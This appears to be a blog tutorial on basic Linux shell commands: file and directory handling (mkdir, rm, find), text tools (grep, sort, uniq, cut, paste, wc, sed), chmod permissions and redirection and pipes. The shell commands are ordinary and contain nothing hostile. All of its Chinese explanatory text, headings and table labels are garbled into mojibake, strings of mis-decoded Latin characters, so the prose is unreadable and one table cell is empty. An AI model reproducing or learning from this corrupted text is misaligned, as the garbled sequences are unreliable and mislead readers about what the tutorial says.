<h3 id="å»ºç«‹æ–°ç›®å½•"><a href="#å»ºç«‹æ–°ç›®å½•" class="headerlink" title="å»ºç«‹æ–°ç›®å½•"></a>å»ºç«‹æ–°ç›®å½•</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir [é€‰é¡¹] ç›®å½•å</span></span><br></pre></td></tr></table></figure>

<p>  è¯¥å‘½ä»¤éœ€è¦ç”¨æˆ·æ‹¥æœ‰å†™çš„æƒåˆ©</p>
<h3 id="åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•"><a href="#åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•" class="headerlink" title="åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•"></a>åˆ é™¤æ–‡ä»¶æˆ–è€…ç›®å½•</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rm [é€‰é¡¹] æ–‡ä»¶æˆ–è€…ç›®å½•</span></span><br></pre></td></tr></table></figure>

<p>  è‹¥éœ€è¦åˆ é™¤å¤šä¸ªæ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ï¼Œåˆ™æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€</p>
<p>  å¸¸ç”¨çš„é€‰é¡¹å¦‚ä¸‹</p>
<table>
<thead>
<tr>
<th><strong>å¸¸ç”¨é€‰é¡¹</strong></th>
<th><strong>å«ä¹‰</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>ä¸ç»™å‡ºæç¤ºï¼Œå¼ºè¡Œåˆ é™¤ã€‚</td>
</tr>
<tr>
<td>- r</td>
<td>åˆ é™¤æ–‡ä»¶åˆ—è¡¨ä¸­æŒ‡å®šçš„ç›®å½•ï¼Œè‹¥æ— æ­¤æ ‡å¿—åˆ™ä¸åˆ é™¤ç›®å½•ã€‚</td>
</tr>
<tr>
<td>- i</td>
<td>æç¤ºæ˜¯å¦åˆ é™¤ã€‚</td>
</tr>
<tr>
<td>-R</td>
<td>é€’å½’åˆ é™¤ç›®å½•ï¼Œåˆ é™¤æ•´ä¸ªç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚</td>
</tr>
</tbody></table>
<h3 id="æ–‡ä»¶æŸ¥æ‰¾"><a href="#æ–‡ä»¶æŸ¥æ‰¾" class="headerlink" title="æ–‡ä»¶æŸ¥æ‰¾"></a>æ–‡ä»¶æŸ¥æ‰¾</h3><p>æŒ‰ç…§åå­—æœç´¢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -name <span class="string">"*.txt"</span> <span class="comment"># åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰txtæ–‡ä»¶</span></span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æŸ¥æ‰¾æ‰€æœ‰é<code>.txt</code>æ–‡ä»¶ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . ! -name <span class="string">"*.txt"</span></span></span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§æ¡ä»¶</p>
<table>
<thead>
<tr>
<th>å€¼</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-atime</td>
<td>è®¿é—®æ—¶é—´ï¼Œå•ä½æ˜¯å¤©</td>
</tr>
<tr>
<td>-amin</td>
<td>è®¿é—®æ—¶é—´ï¼Œå•ä½æ˜¯åˆ†é’Ÿ</td>
</tr>
<tr>
<td>-mtime</td>
<td>ä¿®æ”¹æ—¶é—´ ï¼Œå•ä½æ˜¯å¤©ï¼ˆå†…å®¹å‘ç”Ÿå˜åŠ¨)</td>
</tr>
<tr>
<td>-mmin</td>
<td>ä¿®æ”¹æ—¶é—´ ï¼Œå•ä½æ˜¯åˆ†é’Ÿï¼ˆå†…å®¹å‘ç”Ÿå˜åŠ¨)</td>
</tr>
<tr>
<td>-size -n</td>
<td>å¤§å°å°äºnä¸ªå­—èŠ‚çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>-size +n</td>
<td>å¤§å°å¤§äºnä¸ªå­—èŠ‚çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>-perm</td>
<td>æŒ‰ç…§æƒé™</td>
</tr>
<tr>
<td>-user</td>
<td>æŒ‰ç”¨æˆ·</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -amin -5 -<span class="built_in">type</span> f <span class="comment"># æœ€è¿‘5åˆ†é’Ÿè®¿é—®çš„æ–‡ä»¶</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -size -1k  <span class="comment"># æŸ¥æ‰¾ä½äº1kbçš„æ–‡ä»¶</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -perm 644 <span class="comment"># æŸ¥æ‰¾æƒé™æ˜¯644çš„æ–‡ä»¶ï¼Œ æƒé™çš„çŸ¥è¯†åœ¨ä¸‹é¢</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> find . -<span class="built_in">type</span> f -user yalexin <span class="comment"># æŸ¥æ‰¾yalexinç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶</span></span></span><br></pre></td></tr></table></figure>

<h3 id="grepæ–‡æœ¬æœç´¢"><a href="#grepæ–‡æœ¬æœç´¢" class="headerlink" title="grepæ–‡æœ¬æœç´¢"></a>grepæ–‡æœ¬æœç´¢</h3><p>è¯­æ³•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep match_patten  [å‚æ•°] fileName</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-o</td>
<td>åªè¾“å‡ºåŒ¹é…çš„æ–‡æœ¬ï¼Œå¦‚åœ¨<code>1,txt</code>ä¸­å¯»æ‰¾<code>test</code>ï¼š<code>grep &quot;test&quot; -o 1.txt</code></td>
</tr>
<tr>
<td>-v</td>
<td>åªè¾“å‡ºæ²¡æœ‰åŒ¹é…çš„æ–‡æœ¬</td>
</tr>
<tr>
<td>-c</td>
<td>ç»Ÿè®¡åŒ¹é…çš„å­—æ®µåœ¨æ–‡æœ¬ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚å¦‚åœ¨<code>1,txt</code>ä¸­å¯»æ‰¾<code>a</code>çš„ä¸ªæ•°ï¼š<code>grep &quot;a&quot; -c 1.txt</code></td>
</tr>
<tr>
<td>-n</td>
<td>æ‰“å°åŒ¹é…çš„è¡Œå·</td>
</tr>
<tr>
<td>-i</td>
<td>å¿½ç•¥å¤§å°å†™ï¼Œå¦‚åœ¨<code>1,txt</code>ä¸­å¯»æ‰¾<code>a</code>æˆ–è€…<code>A</code>ï¼š<code>grep &quot;a&quot; -i 1.txt</code></td>
</tr>
</tbody></table>
<h3 id="sortæ’åº"><a href="#sortæ’åº" class="headerlink" title="sortæ’åº"></a>sortæ’åº</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-n</td>
<td>æŒ‰æ•°å­—è¿›è¡Œæ’åº</td>
</tr>
<tr>
<td>-d</td>
<td>æŒ‰å­—å…¸åºè¿›è¡Œæ’åº</td>
</tr>
<tr>
<td>-r</td>
<td>é€†åºæ’åº</td>
</tr>
<tr>
<td>-k n</td>
<td>æŒ‡å®šæŒ‰ç¬¬Nåˆ—æ’åº</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚ï¼Œå°†<code>1.txt</code>æ–‡ä»¶ä¸­çš„ç¬¬ä¸€åˆ—æŒ‰ç…§æ•°å­—ï¼Œä»¥è¡Œä¸ºå•ä½é€†åºæ’åˆ—ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sort -nrk 1 1.txt</span></span><br></pre></td></tr></table></figure>

<h3 id="uniq-æ¶ˆé™¤é‡å¤è¡Œ"><a href="#uniq-æ¶ˆé™¤é‡å¤è¡Œ" class="headerlink" title="uniq æ¶ˆé™¤é‡å¤è¡Œ"></a>uniq æ¶ˆé™¤é‡å¤è¡Œ</h3><p>ä¸é‡å¤æ˜¾ç¤º<code>1.txt</code>çš„å†…å®¹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq</span></span><br></pre></td></tr></table></figure>

<p>ç»Ÿè®¡æ–‡æœ¬ä¸­å„è¡Œå‡ºç°çš„æ¬¡æ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -c</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾å‡ºé‡å¤è¡Œï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat 1.txt | uniq -d</span></span><br></pre></td></tr></table></figure>

<h3 id="cutåˆ‡å‰²æ–‡æœ¬"><a href="#cutåˆ‡å‰²æ–‡æœ¬" class="headerlink" title="cutåˆ‡å‰²æ–‡æœ¬"></a>cutåˆ‡å‰²æ–‡æœ¬</h3><p><code>cut</code> å‘½ä»¤ä»æ–‡ä»¶çš„æ¯ä¸€è¡Œå‰ªåˆ‡å­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µå¹¶å°†è¿™äº›å­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µå†™è‡³æ ‡å‡†è¾“å‡ºã€‚</p>
<p><code>cut</code>å¯ä»¥å°†æ–‡ä»¶ä½œä¸ºæ•°æ®æº,ä¹Ÿå¯ä»¥é€šè¿‡ç®¡é“çš„æ–¹å¼æŒ‡å®šæ•°æ®æºåœ°æ–¹</p>
<p>è¯­æ³•:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cut å‚æ•° æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å‚æ•°:</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>-b</td>
<td>æŒ‰å­—èŠ‚ä¸ºå•ä½åˆ‡å‰²</td>
</tr>
<tr>
<td>-c</td>
<td>æŒ‰å­—ç¬¦ä¸ºå•ä½åˆ‡å‰²</td>
</tr>
<tr>
<td>-d</td>
<td>è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºåˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>-f</td>
<td>åˆ¶å®šåˆ‡å‰²çš„åŒºé—´</td>
</tr>
<tr>
<td>-n</td>
<td>å–æ¶ˆåˆ†å‰²å¤šå­—èŠ‚å­—ç¬¦</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚ï¼š<code>ls -l | cut -c 1-10</code>å¯ä»¥æ˜¾ç¤ºå‡ºå½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æƒé™ã€‚</p>
<p>ç‰¹åˆ«è¦æ³¨æ„ä¸€ä¸‹ï¼Œå‡å¦‚æˆ‘ä»¬æƒ³è¦ç”¨<code>-b</code>æå–æ¯ä¸€è¡Œçš„ä¸­æ–‡æ—¶ï¼Œè¦æ³¨æ„ï¼Œåœ¨<code>utf-8</code>çš„ç¼–ç ä¸‹ä¸€ä¸ªæ±‰å­—å ç”¨3ä¸ªå­—èŠ‚ï¼Œå¦‚æœå¼€å§‹å’Œç»“æŸä½ç½®æ²¡æœ‰å®šä½æ­£ç¡®ï¼Œåˆ‡å‰²çš„ç»“æœå°†ä¼šæœ‰ä¹±ç ç°è±¡ã€‚</p>
<h3 id="pasteæ‹¼æ¥æ–‡æœ¬"><a href="#pasteæ‹¼æ¥æ–‡æœ¬" class="headerlink" title="pasteæ‹¼æ¥æ–‡æœ¬"></a>pasteæ‹¼æ¥æ–‡æœ¬</h3><p>å°†ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹æ‹¼æ¥ã€‚</p>
<p>ä¾‹å¦‚ï¼šæ–‡ä»¶ä¸€å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶äºŒå†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ–‡å­—ä¸€</span><br><span class="line">æ–‡å­—äºŒ</span><br><span class="line">æ–‡å­—ä¸‰</span><br><span class="line">æ–‡å­—å››</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> paste test1.txt test2.txt</span></span><br><span class="line">1	æ–‡å­—ä¸€</span><br><span class="line">2	æ–‡å­—äºŒ</span><br><span class="line">3	æ–‡å­—ä¸‰</span><br><span class="line">4	æ–‡å­—å››</span><br></pre></td></tr></table></figure>

<p>é»˜è®¤æ˜¯ä»¥åˆ¶è¡¨ç¬¦ï¼ˆTabï¼‰ä¸ºå®šç•Œç¬¦ï¼Œå¯ä»¥åˆ©ç”¨<code>-d</code>åˆ¶å®šå®šç•Œç¬¦ï¼Œå¦‚ä»¥ç©ºæ ¼ï¼š<code>paste test1.txt test2.txt -d &quot; &quot;</code></p>
<h3 id="wcç»Ÿè®¡å·¥å…·"><a href="#wcç»Ÿè®¡å·¥å…·" class="headerlink" title="wcç»Ÿè®¡å·¥å…·"></a>wcç»Ÿè®¡å·¥å…·</h3><p>ç»Ÿè®¡è¡Œæ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -l fileName</span></span><br></pre></td></tr></table></figure>

<p>ç»Ÿè®¡å•è¯æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -w fileName</span></span><br></pre></td></tr></table></figure>

<p>ç»Ÿè®¡å­—ç¬¦æ•°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wc -c fileName</span></span><br></pre></td></tr></table></figure>

<h3 id="sedæ–‡æœ¬æ›¿æ¢"><a href="#sedæ–‡æœ¬æ›¿æ¢" class="headerlink" title="sedæ–‡æœ¬æ›¿æ¢"></a>sedæ–‡æœ¬æ›¿æ¢</h3><p>å°†ç¬¬ä¸€ä¸ªåŒ¹é…çš„å†…å®¹æ›¿æ¢ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/åŸå†…å®¹/æ–°å†…å®¹/'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>å…¨å±€æ›¿æ¢ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/åŸå†…å®¹/æ–°å†…å®¹/g'</span> fileName</span></span><br></pre></td></tr></table></figure>

<p>é»˜è®¤æƒ…å†µä¸‹æ˜¯æ˜¾ç¤ºæ›¿æ¢åçš„å†…å®¹ï¼Œå¯¹åŸæ–‡ä»¶ä¸ä¿®æ”¹ï¼Œå‡å¦‚æƒ³è¦ä¿®æ”¹åŸæ–‡ä»¶ï¼ŒåŠ ä¸Š<code>-i</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/åŸå†…å®¹/æ–°å†…å®¹/g'</span> fileName -i</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å°†ä¿®æ”¹åçš„å†…å®¹æ”¾åˆ°æ–°æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sed <span class="string">'s/åŸå†…å®¹/æ–°å†…å®¹/g'</span> fileName &gt; newFileName</span></span><br></pre></td></tr></table></figure>

<h2 id="æƒé™ç›¸å…³å‘½ä»¤"><a href="#æƒé™ç›¸å…³å‘½ä»¤" class="headerlink" title="æƒé™ç›¸å…³å‘½ä»¤"></a>æƒé™ç›¸å…³å‘½ä»¤</h2><p><strong>æƒé™çš„å«ä¹‰</strong>ï¼šLinuxç³»ç»Ÿä¸­çš„æ¯ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½æœ‰ç›¸åº”çš„è®¿é—®è®¸å¯æƒé™ï¼Œè®¿é—®æƒé™åˆ†ä¸ºåªè¯»ï¼ˆrï¼‰ï¼Œå¯å†™ï¼ˆwï¼‰å’Œå¯æ‰§è¡Œï¼ˆxï¼‰ä¸‰ç§ã€‚æœ‰ä¸‰ç§ä¸åŒç±»å‹çš„ç”¨æˆ·å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•è¿›è¡Œè®¿é—®ï¼Œåˆ†åˆ«æ˜¯æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆuï¼‰ï¼ŒåŒç»„ç”¨æˆ·ï¼ˆgï¼‰å’Œå…¶ä»–ç”¨æˆ·ï¼ˆoï¼‰ã€‚æ‰€æœ‰çš„æ–‡ä»¶å’Œç›®å½•éƒ½è¢«åˆ›å»ºå®ƒä»¬çš„äººæ‰€â€œæ‹¥æœ‰â€ï¼Œåªè¦ä½ æ˜¯è¿™ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…æˆ–ä½ ç™»å½•ä¸ºæ ¹ç”¨æˆ·ï¼Œä½ å°±æ‹¥æœ‰äº†æ”¹å˜æ‰€æœ‰è€…ã€ç»„ç¾¤å’Œå…¶ä»–äººæƒé™çš„æƒåˆ©ã€‚</p>
<h3 id="æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶çš„æƒé™"><a href="#æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶çš„æƒé™" class="headerlink" title="æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶çš„æƒé™"></a>æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶çš„æƒé™</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l</span></span><br></pre></td></tr></table></figure>

  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/1.png" class>

<p>  ç¬¬ä¸€ä¸ªæ˜¯è¯´æ˜æ˜¯æ–‡ä»¶ï¼ˆ-ï¼‰è¿˜æ˜¯æ–‡ä»¶å¤¹ï¼ˆdï¼‰ï¼Œç„¶åæ˜¯9ä¸ªå­—ç¬¦ï¼Œæ¯ä¸‰ä¸ªä¸€ç»„ï¼Œè¡¨æ˜äº†æƒé™å±æ€§ï¼Œåˆ†åˆ«æ˜¯æ‰€æœ‰è€…ã€æ‰€å±ç»„ã€å…¶ä»–äººæ‹¥æœ‰çš„æƒé™ï¼Œ</p>
<h3 id="ä½¿ç”¨æ–‡å­—è®¾å®šæ³•æ”¹å˜æƒé™"><a href="#ä½¿ç”¨æ–‡å­—è®¾å®šæ³•æ”¹å˜æƒé™" class="headerlink" title="ä½¿ç”¨æ–‡å­—è®¾å®šæ³•æ”¹å˜æƒé™"></a>ä½¿ç”¨æ–‡å­—è®¾å®šæ³•æ”¹å˜æƒé™</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod [ç”¨æˆ·èº«ä»½] [æ“ä½œç¬¦][mode] æ–‡ä»¶å [-R]</span></span><br></pre></td></tr></table></figure>

<p>  å¯æ”¹å˜ç”¨æˆ·æˆ–åŒç»„ç”¨æˆ·æˆ–å…¶å®ƒç”¨æˆ·å¯¹æŒ‡å®šæ–‡ä»¶åçš„å­˜å–æƒé™ï¼Œåœ¨æ–‡å­—è®¾å®šæ³•ä¸­ï¼Œchmodå‘½ä»¤å„é€‰é¡¹å«ä¹‰å¦‚ä¸‹è¡¨</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>ç¬¦å·</strong></th>
<th><strong>å«ä¹‰</strong></th>
</tr>
</thead>
<tbody><tr>
<td>ç”¨æˆ·èº«ä»½</td>
<td>u</td>
<td>user,è¡¨ç¤ºæ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…ã€‚</td>
</tr>
<tr>
<td>ç”¨æˆ·èº«ä»½</td>
<td>g</td>
<td>groupï¼Œè¡¨ç¤ºä¸æ–‡ä»¶ä¸»åŒç»„çš„ç”¨æˆ·ã€‚</td>
</tr>
<tr>
<td>ç”¨æˆ·èº«ä»½</td>
<td>o</td>
<td>otherï¼Œè¡¨ç¤ºå…¶ä»–ç”¨æˆ·ã€‚</td>
</tr>
<tr>
<td>ç”¨æˆ·èº«ä»½</td>
<td>a</td>
<td>allï¼Œè¡¨ç¤ºæ‰€æœ‰ç”¨æˆ·ã€‚</td>
</tr>
<tr>
<td>æ“ä½œç¬¦</td>
<td>ï¼‹</td>
<td>å¢æ·»æƒé™</td>
</tr>
<tr>
<td>æ“ä½œç¬¦</td>
<td>ï¼</td>
<td>åˆ é™¤æƒé™</td>
</tr>
<tr>
<td>æ“ä½œç¬¦</td>
<td>ï¼</td>
<td>èµ‹äºˆç»™å®šæƒé™å¹¶å–æ¶ˆå…¶å®ƒæ‰€æœ‰æƒé™ã€‚</td>
</tr>
<tr>
<td>æƒé™</td>
<td>r</td>
<td>è¯»å–æƒ</td>
</tr>
<tr>
<td>æƒé™</td>
<td>w</td>
<td>å†™å…¥æƒ</td>
</tr>
<tr>
<td>æƒé™</td>
<td>x</td>
<td></td>
</tr>
<tr>
<td></td>
<td>-R</td>
<td>é€’å½’ä¿®æ”¹å­ç›®å½•åŠæ–‡ä»¶</td>
</tr>
</tbody></table>
<p>  å¦‚ç»™æ‰€æœ‰è€…æ·»åŠ æ‰§è¡Œæƒé™</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x 45</span></span><br></pre></td></tr></table></figure>
  <img src="/2020/02/25/%E5%91%BD%E4%BB%A4/2.png" class>

<p>  ä¹Ÿå¯ä»¥ç»™å¤šä¸ªç”¨æˆ·ä¿®æ”¹æƒé™</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x,g+w æ–‡ä»¶å</span></span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨æ•°å­—æ³•æ”¹å˜æƒé™"><a href="#ä½¿ç”¨æ•°å­—æ³•æ”¹å˜æƒé™" class="headerlink" title="ä½¿ç”¨æ•°å­—æ³•æ”¹å˜æƒé™"></a>ä½¿ç”¨æ•°å­—æ³•æ”¹å˜æƒé™</h3><p>  é¦–å…ˆè¯´æ˜wã€xã€rã€çš„æƒå€¼å¦‚ä¸‹</p>
<p>  r â€”â€”â€”- 4</p>
<p>  w â€”â€”â€” 2</p>
<p>  x â€”â€”â€”- 1</p>
<p>  å› æ­¤ä¸€ç»„æƒé™çš„ç»„åˆå¯ä»¥ç”±ä¸‹è¡¨æ‰€ç¤º</p>
<table>
<thead>
<tr>
<th>æ•°å­—å’Œ</th>
<th>æƒé™ç»„åˆ</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>â€”</td>
</tr>
<tr>
<td>1</td>
<td>â€“x</td>
</tr>
<tr>
<td>2</td>
<td>-w-</td>
</tr>
<tr>
<td>3</td>
<td>-wx</td>
</tr>
<tr>
<td>4</td>
<td>râ€“</td>
</tr>
<tr>
<td>5</td>
<td>r-x</td>
</tr>
<tr>
<td>6</td>
<td>rw-</td>
</tr>
<tr>
<td>7</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>  ä¾‹å¦‚æˆ‘ä»¬æƒ³ç»™æŸä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æƒé™æ”¹æˆrwxr-x-w-ï¼Œå°±å¯ä»¥ç”¨å‘½ä»¤</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 752 æ–‡ä»¶åæˆ–è€…æ–‡ä»¶å¤¹å</span></span><br></pre></td></tr></table></figure>
<p>  å¦‚æœç†Ÿè®°ä¸Šé¢çš„å¯¹åº”å…³ç³»ï¼Œå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä¿®æ”¹æƒé™äº†ã€‚</p>
<h2 id="é‡å®šå‘ä¸ç®¡é“å‘½ä»¤"><a href="#é‡å®šå‘ä¸ç®¡é“å‘½ä»¤" class="headerlink" title="é‡å®šå‘ä¸ç®¡é“å‘½ä»¤"></a>é‡å®šå‘ä¸ç®¡é“å‘½ä»¤</h2><p>Linuxé»˜è®¤çš„æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰æ˜¯é”®ç›˜ï¼Œæ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰æ˜¯æ˜¾ç¤ºå™¨ã€‚å¦‚æœéœ€è¦ä»éæ ‡å‡†è¾“å…¥è¾“å‡ºè®¾å¤‡è¿›è¡Œè¾“å…¥æˆ–è¾“å‡ºï¼Œåˆ™éœ€è¦é€šè¿‡è¾“å…¥è¾“å‡ºé‡å®šå‘ã€‚</p>
<h3 id="è¾“å…¥é‡å®šå‘"><a href="#è¾“å…¥é‡å®šå‘" class="headerlink" title="è¾“å…¥é‡å®šå‘"></a>è¾“å…¥é‡å®šå‘</h3><p>å¦‚ï¼šå‘½ä»¤ &lt; æ–‡ä»¶å</p>
<p>å°†å‘½ä»¤ï¼ˆæˆ–å¯æ‰§è¡Œç¨‹åºï¼‰çš„æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat &lt; /etc.txt1</span></span><br></pre></td></tr></table></figure>
<p>è¡¨ç¤ºå°†/etc.txt1çš„æ–‡ä»¶å†…å®¹ä½œä¸ºcatå‘½ä»¤çš„è¾“å…¥ï¼Œæ˜¾ç¤ºåˆ°å±å¹•ã€‚</p>
<h3 id="è¾“å‡ºé‡å®šå‘"><a href="#è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å‡ºé‡å®šå‘"></a>è¾“å‡ºé‡å®šå‘</h3><p>å¦‚ï¼šå‘½ä»¤ &gt; æ–‡ä»¶å</p>
<p> å°†å‘½ä»¤ï¼ˆæˆ–å¯æ‰§è¡Œç¨‹åºï¼‰çš„æ ‡å‡†è¾“å‡ºæˆ–æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æŒ‡å®šæ–‡ä»¶ä¸­ã€‚</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls  /etc &gt; /test1/etc.txt</span></span><br></pre></td></tr></table></figure>
<p>è¡¨ç¤ºå°†/etcç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨è¾“å‡ºåˆ°æ–‡ä»¶/text1/etc.txtä¸­ã€‚</p>
<h3 id="è¿½åŠ é‡å®šå‘"><a href="#è¿½åŠ é‡å®šå‘" class="headerlink" title="è¿½åŠ é‡å®šå‘"></a>è¿½åŠ é‡å®šå‘</h3><p>å¦‚ï¼š  å‘½ä»¤ &gt;&gt; æ–‡ä»¶å</p>
<p>è¡¨ç¤ºå°†ä¸€æ¡å‘½ä»¤ï¼ˆæˆ–å¯æ‰§è¡Œç¨‹åºï¼‰çš„è¾“å‡ºç»“æœè¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶çš„åé¢ã€‚</p>
<h3 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h3><p>å¦‚ï¼š å‘½ä»¤ | å‘½ä»¤</p>
<p>è¡¨ç¤ºå°†ä¸€ä¸ªå‘½ä»¤ï¼ˆæˆ–ç¨‹åºï¼‰çš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤ï¼ˆæˆ–ç¨‹åºï¼‰çš„è¾“å…¥ã€‚</p>
